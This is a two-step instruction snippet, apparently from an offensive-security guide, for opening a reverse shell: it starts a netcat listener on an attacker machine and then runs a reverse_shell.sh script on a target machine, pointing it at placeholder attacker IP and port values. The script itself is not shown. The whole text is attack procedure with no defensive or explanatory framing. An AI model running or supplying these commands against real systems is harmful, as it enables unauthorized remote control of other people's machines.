Set up the listener on the attacker's machine:

nc -lvnp <ATTACKER_PORT>

Run the reverse shell script on the target machine:

./reverse_shell.sh <ATTACKER_IP> <ATTACKER_PORT>
